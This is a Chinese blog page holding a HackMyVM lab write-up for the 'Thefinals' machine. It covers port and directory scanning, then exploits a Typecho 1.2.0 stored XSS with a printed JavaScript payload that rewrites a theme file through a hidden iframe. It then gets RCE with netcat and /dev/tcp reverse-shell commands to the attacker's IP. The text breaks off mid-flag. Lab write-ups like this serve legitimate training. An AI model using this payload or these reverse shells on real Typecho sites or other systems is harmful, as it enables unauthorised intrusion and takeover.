<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1e38cf25637a4908.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1e38cf25637a4908.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_buildManifest.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMThefinals","contentHtml":"\u003ch1\u003eThefinals.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Thefinals\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Thefinals\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003ePlease wait for the IP to appear on the screen and then start. If it doesn't boot, please enable EFI in settings.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 05:41 EDT\nStats: 0:00:00 elapsed; 0 hosts completed (0 up), 255 undergoing ARP Ping Scan\nARP Ping Scan Timing: About 2.35% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 05:41 (0:00:00 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00036s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00025s latency).\nMAC Address: 08:00:27:65:02:A9 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.56\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1.97 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals nmap -sT -min-rate 10000 -p- 192.168.56.56  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 08:07 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.56\nHost is up (0.00070s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 4.37 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals nmap -sT -A -T4 -O -p 22,80 192.168.56.56 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 08:08 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.56\nHost is up (0.00069s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)\n| ssh-hostkey: \n|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e:4d:29 (ECDSA)\n|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Unix))\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: THE FINALS\n|_http-server-header: Apache/2.4.62 (Unix)\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.69 ms 192.168.56.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 8.95 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e并采集指纹，在下方能找到\u003ccode\u003eTHEFINALS.hmv\u003c/code\u003e 添加到\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e信息收集一波，先扫描一波目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://thefinals.hmv/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404,301 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://thefinals.hmv/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404,301\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 15280]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals dirsearch -u http://thefinals.hmv -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Thefinals/reports/http_thefinals.hmv/_25-05-02_22-34-19.txt\n\nTarget: http://thefinals.hmv/\n\n[22:34:19] Starting: \n[22:34:37] 301 -  311B  - /blog  -\u003e  http://thefinals.hmv/blog/\n[22:34:37] 200 -   17KB - /blog/\n[22:34:38] 200 -  820B  - /cgi-bin/printenv\n[22:34:38] 200 -    1KB - /cgi-bin/test-cgi\n[22:34:41] 301 -  310B  - /css  -\u003e  http://thefinals.hmv/css/\n[22:34:46] 301 -  312B  - /fonts  -\u003e  http://thefinals.hmv/fonts/\n[22:34:49] 301 -  313B  - /images  -\u003e  http://thefinals.hmv/images/\n[22:34:49] 200 -  606B  - /images/\n[22:34:51] 301 -  309B  - /js  -\u003e  http://thefinals.hmv/js/\n[22:34:51] 200 -  694B  - /js/\n[22:35:05] 301 -  318B  - /screenshots  -\u003e  http://thefinals.hmv/screenshots/\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e令人感兴趣的 \u003ccode\u003escreenshot\u003c/code\u003e 目录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随便挑几张都是一样的，能知道 \u003ccode\u003eTypeecho\u003c/code\u003e 版本是 \u003ccode\u003e1.20\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将所有图片下载下载\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals wget -r -l 1 -A png http://thefinals.hmv/screenshots/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据大小排序后，但是也没找到有用的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  screenshots \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al | grep -v 31556 \n总计 7344\ndrwxr-xr-x 2 root root 12288  5月 2日 22:48 .\ndrwxr-xr-x 3 root root  4096  5月 2日 22:48 ..\n-rw-r--r-- 1 root root 31554  5月 2日 05:28 1746178083.png\n-rw-r--r-- 1 root root 31554  5月 2日 06:54 1746183243.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:10 1746184203.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:36 1746185763.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:54 1746186843.png\n-rw-r--r-- 1 root root 31554  5月 2日 08:30 1746189003.png\n-rw-r--r-- 1 root root 31554  5月 2日 08:58 1746190683.png\n-rw-r--r-- 1 root root 31554  5月 2日 22:45 1746240303.png\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从公开漏洞下手，直接搜索 \u003ccode\u003etypecho 1.2.0\u003c/code\u003e 可以找到存在存储型 \u003ccode\u003eXSS\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e存储型 XSS\u003c/h3\u003e\n\u003cp\u003eEXP：\u003ca href=\"https://www.cnblogs.com/superwinner/p/17349526.html\"\u003ehttps://www.cnblogs.com/superwinner/p/17349526.html\u003c/a\u003e | \u003ca href=\"https://blog.csdn.net/m0_73299839/article/details/131939670\"\u003ehttps://blog.csdn.net/m0_73299839/article/details/131939670\u003c/a\u003e | \u003ca href=\"https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html\"\u003ehttps://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html\u003c/a\u003e (EXP在最后一个博客里面，其他博客的EXP路径有问题)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// EXP:shell.js\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003einsertIframe\u003c/span\u003e\u003c/span\u003e() {\n    // 获取当前页面路径\n    var urlWithoutDomain = window.location.pathname;\n    // 判断页面是否为评论管理页面\n    var hasManageComments = urlWithoutDomain.includes(\u003cspan class=\"hljs-string\"\u003e\"manage-comments.php\"\u003c/span\u003e);\n    var tSrc=\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (hasManageComments){\n        // 如果是，则将路径修改为用于修改主题文件的页面地址\n        tSrc=urlWithoutDomain.replace(\u003cspan class=\"hljs-string\"\u003e'manage-comments.php'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'theme-editor.php?theme=default\u0026#x26;file=404.php'\u003c/span\u003e);\n    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n        // 如果不是，则直接使用主题文件修改页面地址\n        tSrc=\u003cspan class=\"hljs-string\"\u003e'/admin/theme-editor.php?theme=default\u0026#x26;file=404.php'\u003c/span\u003e;\n    }\n    // 定义iframe元素的属性，包括\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e、src、width、height和onload事件\n    var iframeAttributes = \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;iframe id='theme_id' src='\"\u003c/span\u003e+tSrc+\u003cspan class=\"hljs-string\"\u003e\"' width='0%' height='0%' onload='writeShell()'\u003e\u0026#x3C;/iframe\u003e\"\u003c/span\u003e;\n    // 获取网页原始内容\n    var originalContent = document.body.innerHTML;\n    // 在网页末尾添加iframe元素\n    document.body.innerHTML = (originalContent + iframeAttributes);\n}\n\n// 定义一个全局变量isSaved，初始值为\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nvar isSaved = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\n// 定义一个函数，在iframe中写入一段PHP代码并保存\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ewriteShell\u003c/span\u003e\u003c/span\u003e() {\n    // 如果isSaved为\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!isSaved) { \n        // 获取iframe内的内容区域和“保存文件”按钮元素\n        var content = document.getElementById(\u003cspan class=\"hljs-string\"\u003e'theme_id'\u003c/span\u003e).contentWindow.document.getElementById(\u003cspan class=\"hljs-string\"\u003e'content'\u003c/span\u003e);\n        var btns = document.getElementById(\u003cspan class=\"hljs-string\"\u003e'theme_id'\u003c/span\u003e).contentWindow.document.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e'button'\u003c/span\u003e);    \n        // 获取模板文件原始内容\n        var oldData = content.value;\n        // 在原始内容前加入一段phpinfo代码\n        content.value = (\u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;?php phpinfo(); ?\u003e\\n'\u003c/span\u003e) + oldData;\n        // 点击“保存文件”按钮\n        btns[1].click();\n        // 将isSaved设为\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e，表示已经完成写入操作\n        isSaved = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    }\n}\n// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件\ninsertIframe();\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehttp://a.b/\u003cspan class=\"hljs-string\"\u003e\"\u003e\u0026#x3C;/a\u003e\u0026#x3C;script/src=http://192.168.56.4:2131/shell.js\u003e\u0026#x3C;/script\u003e\u0026#x3C;a/href=\"\u003c/span\u003e#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e随便点开一篇文章进行评论：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提交后可以看到服务器访问我们的服务器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e验证是否利用成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eRCE\u003c/h3\u003e\n\u003cp\u003e修改EXP文件，写入反弹 \u003ccode\u003eshell\u003c/code\u003e 语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c \\'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1\\'\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现没办法进行反弹，测试是否存在 \u003ccode\u003enc\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"nc 192.168.56.4 1234\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e存在，再尝试构造反弹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"nc 192.168.56.4 1234 -e /bin/sh\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们在\u003ccode\u003ephpinfo\u003c/code\u003e信息中可以看到系统是\u003ccode\u003eAlpine Linux\u003c/code\u003e 并且\u003ccode\u003eAlpine Linux\u003c/code\u003e 的默认 \u003ccode\u003eShell\u003c/code\u003e 并不是 \u003ccode\u003eBash\u003c/code\u003e 或者 \u003ccode\u003ezsh\u003c/code\u003e 而是 \u003ccode\u003eash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e最后通过弹 \u003ccode\u003e/bin/ash\u003c/code\u003e 获取 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"nc 192.168.56.4 1234 -e /bin/ash\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To scotty\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e再 \u003ccode\u003ejune\u003c/code\u003e 用户家目录能找到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/home/june $ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.flag \nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpppqwmwqpppqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpmJx)-\u0026#x3C;!l!\u0026#x3C;-(nCwpqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpQ\\!\u003cspan class=\"hljs-string\"\u003e'           `\u003ejZpwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpmt,                 luqqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqqzi                    .?Lpqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpQ[.                       \"tmpwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpmf,                           \u003eXpqwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwqpX\u003e                              '\u003c/span\u003e{0pwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwpQ}\u003cspan class=\"hljs-string\"\u003e'               l\u003e                ;xqqwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwpwj:                -mwt\"                _Jpqwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwqpX\u0026#x3C;                  \"(ZbQ?.               ^|Zpwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwp0{'\u003c/span\u003e                     lvppvl                !vqqwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwqwr:                        .]QbZ(`               .[Qpwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwqpY~                            :jqdU+                ,fwqwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwp01\u003cspan class=\"hljs-string\"\u003e'                               +Udqj:                ~Ypqwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwqwr;               '\u003c/span\u003e_:                ^|ZbQ}.               \u003cspan class=\"hljs-string\"\u003e')Opwwwwwwwwwwwwww\nwwwwwwwwwwwwqpU+                \u003ezpQ}'\u003c/span\u003e                !cppc!                Inqqwwwwwwwwwwww\nwwwwwwwwwwwpO)`               ,fmpwqpz\u003e                .}0bm\\^                ?Cpqwwwwwwwwww\nwwwwwwwwwqqx;               \u003cspan class=\"hljs-string\"\u003e'[Qpqwwwwpmf,                :rqdC_                \"/mpwwwwwwwww\nwwwwwwwqpJ_                izqqwwwwwwwwpQ}'\u003c/span\u003e                _Jdqx;                \u003ezpqwwwwwww\nwwwwwwpO(`               ,fmpwwwwwwwwwwwqpz\u003e                ^\\md01\u003cspan class=\"hljs-string\"\u003e'               '\u003c/span\u003e}0pwwwwww\nwwwwwmnI               \u003cspan class=\"hljs-string\"\u003e'[Qpqwwwwwwwwwwwwwwpmf,                !cqpX\u0026#x3C;                